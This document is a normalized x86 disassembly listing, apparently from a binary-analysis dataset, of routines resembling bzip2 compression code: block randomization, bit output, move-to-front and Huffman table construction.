cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001a257
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
movzx eax [ ebp - 0x1 ]
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_1001a257
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edi ]
movzx ecx al
movzx eax [ ebx + eax * 2 ]
and cl 0x1
shl cl 0x2
shr edx cl
and edx 0xf
shl edx 0x10
or edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x38 ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
and [ esi + 0x18 ] 0x0
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_1001a257
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
dec [ esi + 0x14 ]
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x14 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
xor eax eax
cmp ecx 0x1
movzx ecx [ ebp - 0x1 ]
sete al
xor eax ecx
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_1001a257
mov edx [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx edx
shr ecx 0x1
mov [ esi + 0x3c ] eax
movzx edi [ ecx + edi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
movzx ecx [ ebx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
mov ecx [ esi + 0x14 ]
mov [ esi + 0x38 ] edi
test ecx ecx
jne r-xdata
and [ esi + 0x18 ] 0x0
dec [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
xor edx edx
cmp ecx 0x1
sete dl
xor edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x3c ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ ecx * 4 + rw-data ]
inc ecx
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] ecx
cmp ecx 0x200
jne r-xdata
and [ esi + 0x18 ] 0x0
sub_1001a8a4
test eax eax
jne r-xdata
push esi
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop esi
retn
cmp [ esi ] eax
je r-xdata
mov ecx [ esi + 0x4 ]
push ebx
cmp ecx 0x1
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ecx 0x2
jne r-xdata
pop ebx
pop esi
retn
mov ecx [ esi + 0x4 ]
cmp ecx 0xa
jl r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov ebx esi
call sub_1001c83f
cmp eax 0x4
je r-xdata
mov ecx esi
call sub_10019dab
call sub_1001a284
jmp r-xdata
cmp [ esi + 0x30 ] 0x3
jl r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx 0x2
jne r-xdata
push 0xfffffffc
pop eax
jmp r-xdata
mov eax [ esi + 0xfa40 ]
inc eax
cmp [ esi + 0x440 ] eax
jne r-xdata
test al al
jne r-xdata
mov eax [ esi + 0xc64 ]
sub eax [ esi + 0xc5c ]
neg eax
sbb eax eax
and eax 0xfffffff8
add eax 0x4
push [ esi + 0xc64 ]
push [ esi + 0xc5c ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0x10
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
cmp [ esi + 0x30 ] 0x3
mov eax [ esi + 0xc60 ]
not eax
mov [ esi + 0xc60 ] eax
jl r-xdata
cmp [ esi + 0x30 ] 0x2
jl r-xdata
push eax
push [ esi + 0xc58 ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0x10
mov ecx [ esi + 0xc60 ]
cmp ecx [ esi + 0xc58 ]
jne r-xdata
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
pop ecx
lea eax [ esi + 0xc64 ]
mov edx [ eax ]
rol edx 0x1
xor edx ecx
mov [ eax ] edx
mov [ esi + 0x4 ] 0xe
sub_1001a9f0
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
retn
push 0xfffffffe
pop eax
pop edi
retn
cmp [ edi ] esi
je r-xdata
mov eax [ edi + 0xc4c ]
test eax eax
je r-xdata
mov eax [ edi + 0xc50 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0xc54 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
pop edi
retn
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_1001aa55
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi eax
xor eax eax
push edi
cmp ebx eax
je r-xdata
push 0xfffffffe
pop eax
cmp esi eax
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
lea edi [ ebp - 0x30 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
call sub_10019787
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ esi ]
mov [ ebp - 0x1c ] eax
mov eax edi
mov [ ebp - 0x20 ] ebx
call sub_10019c59
mov edi eax
cmp edi 0x3
jne r-xdata
cmp edi 0x4
jne r-xdata
push 0xfffffff8
pop edi
jmp r-xdata
lea esi [ ebp - 0x30 ]
call sub_10019cd0
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x1c ]
sub [ esi ] eax
xor edi edi
sub_1001aacb
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
mov edi eax
mov ebx ecx
xor eax eax
cmp ebx eax
je r-xdata
push 0xfffffffe
pop eax
cmp edi eax
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
lea esi [ ebp - 0x30 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
call sub_10019d2c
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
mov eax [ edi ]
mov [ ebp - 0x1c ] eax
mov eax esi
mov [ ebp - 0x20 ] ebx
call sub_1001a8a4
mov ebx eax
test ebx ebx
jne r-xdata
cmp ebx 0x4
je r-xdata
cmp [ ebp - 0x1c ] eax
jbe r-xdata
mov eax [ ebp - 0x1c ]
sub [ edi ] eax
xor edi edi
lea esi [ ebp - 0x30 ]
call sub_1001a9f0
mov eax ebx
jmp r-xdata
push 0xfffffff8
jmp r-xdata
push 0xfffffff9
pop edi
jmp r-xdata
lea esi [ ebp - 0x30 ]
call sub_1001a9f0
mov eax edi
jmp r-xdata
sub_1001ab59
cmp [ eax + 0x25c ] 0x8
push esi
push edi
mov esi ecx
jl r-xdata
mov edx [ eax + 0x25c ]
mov edi [ esp + 0xc ]
push 0x20
pop ecx
sub ecx edx
sub ecx edi
shl esi cl
add edx edi
pop edi
mov [ eax + 0x25c ] edx
or [ eax + 0x258 ] esi
pop esi
retn
lea ecx [ eax + 0x258 ]
push ebx
mov edi [ eax + 0x4c ]
mov bl [ ecx + 0x3 ]
mov edx [ eax + 0x2c ]
mov [ edx + edi ] bl
inc [ eax + 0x4c ]
shl [ ecx ] 0x8
add [ eax + 0x25c ] 0xfffffff8
cmp [ eax + 0x25c ] 0x8
jge r-xdata
pop ebx
sub_1001abb4
push esi
mov ecx ebx
shr ecx 0x18
push 0x8
call sub_1001ab59
mov ecx ebx
shr ecx 0x10
mov esi 0xff
and ecx esi
push 0x8
call sub_1001ab59
mov ecx ebx
shr ecx 0x8
and ecx esi
push 0x8
call sub_1001ab59
movzx ecx bl
push 0x8
call sub_1001ab59
add esp 0x10
pop esi
retn
sub_1001abf1
push ebp
lea ebp [ esp - 0x9c ]
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x98 ] eax
mov eax [ esi + 0x20 ]
mov [ ebp - 0x80 ] eax
mov eax [ esi + 0x24 ]
push ebx
mov ebx [ esi + 0x28 ]
mov [ ebp - 0x7c ] eax
xor eax eax
push edi
mov [ esi + 0x54 ] eax
inc eax
cmp eax 0x100
jl r-xdata
mov cl [ esi + 0x54 ]
mov [ eax + esi + 0x158 ] cl
inc [ esi + 0x54 ]
cmp [ esi + eax + 0x58 ] 0x0
je r-xdata
mov edx [ esi + 0x54 ]
inc edx
mov [ ebp - 0x78 ] edx
js r-xdata
xor eax eax
xor edi edi
cmp [ esi + 0x54 ] eax
mov [ ebp - 0x70 ] eax
jle r-xdata
lea edi [ esi + 0x278 ]
lea ecx [ edx + 0x1 ]
xor eax eax
[ edi ]
and [ ebp - 0x74 ] 0x0
cmp [ esi + 0x44 ] 0x0
jle r-xdata
mov ecx [ esi + 0x54 ]
mov ecx [ ebp + 0x98 ]
mov [ ebx + edi * 2 ] dx
lea eax [ esi + edx * 4 + 0x278 ]
inc [ eax ]
inc edi
mov [ esi + 0x274 ] edi
pop edi
xor ecx ebp
pop ebx
call sub_10027150
add ebp 0x9c
leave
retn
mov eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x74 ]
mov eax [ eax + ecx * 4 ]
dec eax
jns r-xdata
mov [ ebp + eax - 0x68 ] al
inc eax
cmp eax ecx
jl r-xdata
mov ecx [ ebp - 0x7c ]
movzx eax [ eax + ecx ]
mov al [ eax + esi + 0x158 ]
mov [ ebp - 0x69 ] al
cmp [ ebp - 0x68 ] al
jne r-xdata
add eax [ esi + 0x44 ]
mov eax [ ebp - 0x70 ]
test eax eax
jle r-xdata
inc [ ebp - 0x70 ]
jmp r-xdata
mov al [ ebp - 0x68 ]
mov cl [ ebp - 0x67 ]
mov [ ebp - 0x67 ] al
lea eax [ ebp - 0x67 ]
jmp r-xdata
dec eax
inc [ ebp - 0x74 ]
mov eax [ ebp - 0x74 ]
cmp eax [ esi + 0x44 ]
jl r-xdata
cmp [ ebp - 0x69 ] cl
jne r-xdata
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x278 ]
inc ecx
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x27c ]
jmp r-xdata
mov eax [ ebp - 0x70 ]
test eax eax
jle r-xdata
inc eax
mov dl cl
mov cl [ eax ]
mov [ eax ] dl
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x68 ] cl
lea ecx [ ebp - 0x68 ]
sub eax ecx
lea ecx [ eax + 0x1 ]
mov [ ebx + edi * 2 ] cx
lea eax [ esi + eax * 4 + 0x27c ]
inc edi
inc [ eax ]
and [ ebp - 0x70 ] 0x0
add eax 0xfffffffe
cdq
sub eax edx
sar eax 0x1
jmp r-xdata
cmp eax 0x2
jl r-xdata
dec eax
xor ecx ecx
test al 0x1
je r-xdata
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x278 ]
inc ecx
mov [ ebx + edi * 2 ] cx
inc edi
inc [ esi + 0x27c ]
jmp r-xdata
add eax 0xfffffffe
cdq
sub eax edx
mov edx [ ebp - 0x78 ]
sar eax 0x1
jmp r-xdata
cmp eax 0x2
jl r-xdata
xor ecx ecx
test al 0x1
je r-xdata
sub_1001ad87
push ebp
mov ebp esp
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x268 ] 0x3
push ebx
mov ebx [ esi + 0x28 ]
push edi
jl r-xdata
mov edi [ esi + 0x54 ]
inc edi
inc edi
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x3c ] edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x28 ] 0x6
push [ esi + 0x54 ]
push [ esi + 0x274 ]
push [ esi + 0x44 ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0x14
add [ ebp - 0xc ] 0x102
dec [ ebp - 0x28 ]
jne r-xdata
push edi
push 0xf
push [ ebp - 0xc ]
call sub_10027650
add esp 0xc
test edi edi
jle r-xdata
mov eax [ esi + 0x274 ]
test eax eax
jg r-xdata
cmp eax 0xc8
jge r-xdata
push 0xbb9
cmp eax 0x258
jge r-xdata
mov [ ebp - 0x30 ] 0x2
jmp r-xdata
cmp eax 0x4b0
jge r-xdata
mov [ ebp - 0x30 ] 0x3
jmp r-xdata
mov ecx [ ebp - 0x30 ]
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] eax
test ecx ecx
jle r-xdata
xor ecx ecx
cmp eax 0x960
setge cl
add ecx 0x5
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x30 ] 0x4
jmp r-xdata
and [ ebp - 0x34 ] 0x0
and [ ebp - 0xc ] 0x0
mov eax ecx
add eax 0x91
imul eax eax 0x102
add eax esi
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
mov ecx [ ebp - 0x30 ]
xor eax eax
lea edi [ ebp - 0x5c ]
[ edi ]
mov eax [ ebp - 0x30 ]
lea edx [ esi + 0xb160 ]
mov [ ebp - 0x28 ] eax
cmp edi [ ebp - 0x24 ]
jle r-xdata
lea edx [ esi + edi * 4 + 0x278 ]
mov ecx [ esi + 0x274 ]
xor eax eax
cmp ecx eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
jle r-xdata
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
add edx 0x408
dec [ ebp - 0x28 ]
jne r-xdata
mov ecx [ ebp - 0x3c ]
xor eax eax
mov edi edx
[ edi ]
cmp [ esi + 0x268 ] 0x3
jl r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x30 ]
je r-xdata
add edx 0x4
add ecx [ edx ]
inc edi
cmp ecx [ ebp - 0x28 ]
mov [ ebp - 0x40 ] ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
lea edx [ eax + 0x31 ]
cmp edx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x2c ] edx
jl r-xdata
mov edx [ ebp - 0x3c ]
lea eax [ esi + 0x9324 ]
lea ecx [ esi + 0xc994 ]
mov [ ebp - 0x28 ] edx
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
xor eax eax
cmp [ ebp - 0x3c ] eax
jle r-xdata
fild [ ebp - 0x40 ]
push ecx
push ecx
fmul [ r--data ]
fidiv [ esi + 0x274 ]
fstp [ esp ]
push [ ebp - 0x40 ]
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x34 ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
mov ecx [ ebp - 0x40 ]
add esp 0x20
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x3c ]
dec eax
cmp edi eax
jge r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
push eax
mov eax [ ebp - 0x34 ]
inc eax
push eax
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
xor edi edi
add esp 0x10
cmp [ ebp - 0x30 ] edi
jle r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
jle r-xdata
dec ecx
mov [ ebp - 0x2c ] ecx
movzx edx [ eax + 0x102 ]
movzx edi [ eax ]
shl edx 0x10
or edx edi
mov [ ecx - 0x4 ] edx
movzx edx [ eax + 0x306 ]
movzx edi [ eax + 0x204 ]
shl edx 0x10
or edx edi
mov [ ecx ] edx
movzx edx [ eax + 0x50a ]
movzx edi [ eax + 0x408 ]
shl edx 0x10
or edx edi
mov [ ecx + 0x4 ] edx
inc eax
add ecx 0x10
dec [ ebp - 0x28 ]
jne r-xdata
dec [ ebp - 0x34 ]
sub [ ebp - 0x2c ] 0x102
inc [ ebp - 0xc ]
sub [ ebp - 0x20 ] ecx
inc edi
cmp [ ebp - 0x34 ] 0x0
mov [ ebp - 0x24 ] edi
jg r-xdata
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0xc ]
and eax 0x80000001
jns r-xdata
inc [ ebp - 0x34 ]
cmp [ ebp - 0x34 ] 0x4
jl r-xdata
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x30 ]
lea edi [ esi + 0xb160 ]
mov [ ebp - 0xc ] eax
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
pop ecx
push [ ebp + edi * 4 - 0x5c ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
inc edi
cmp edi [ ebp - 0x30 ]
jl r-xdata
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
lea edi [ ebp - 0x18 ]
[ edi ]
adc ecx ecx
[ edi ]
mov eax [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
cdq
idiv [ ebp - 0x34 ]
mov edi [ ebp - 0x24 ]
xor ecx ecx
dec edi
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x28 ] eax
test eax eax
jle r-xdata
mov edx [ ebp - 0x2c ]
mov [ edx + eax ] 0xf
cmp eax edi
jg r-xdata
cmp eax 0x1
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
cmp [ ebp - 0x30 ] 0x8
jl r-xdata
push [ ebp - 0x3c ]
mov ecx edi
push [ ebp - 0x28 ]
call sub_1001fc84
add [ ebp - 0x28 ] 0x102
pop ecx
add edi 0x408
dec [ ebp - 0xc ]
pop ecx
jne r-xdata
cmp eax [ ebp - 0x2c ]
mov ecx eax
jmp r-xdata
mov ecx [ ebp - 0x2c ]
sub ecx eax
inc ecx
cmp ecx 0x32
jne r-xdata
mov edx [ ebp - 0x2c ]
mov [ edx + eax ] 0x0
jmp r-xdata
sub ecx [ esi + edi * 4 + 0x278 ]
dec edi
mov [ ebp - 0x40 ] ecx
mov ecx [ ebp - 0x40 ]
cmp ecx 0x8000
jge r-xdata
push 0xbba
jmp r-xdata
mov [ ebp - 0x24 ] ecx
jle r-xdata
mov eax [ ebp - 0x24 ]
lea edi [ ebx + eax * 2 ]
movzx eax [ edi ]
movzx edi [ edi + 0x2 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
movzx ecx ax
lea eax [ ecx + 0xc99 ]
shl eax 0x4
mov eax [ eax + esi ]
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
shl ecx 0x4
lea edx [ ecx + esi ]
mov ecx [ edx + 0xc994 ]
add ecx [ edi + 0xc994 ]
mov edx [ edx + 0xc998 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x6 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x8 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xa ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xc ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xe ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x10 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x12 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x14 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x16 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x18 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x20 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x22 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x24 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x26 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x28 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x30 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x32 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x34 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x36 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x38 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
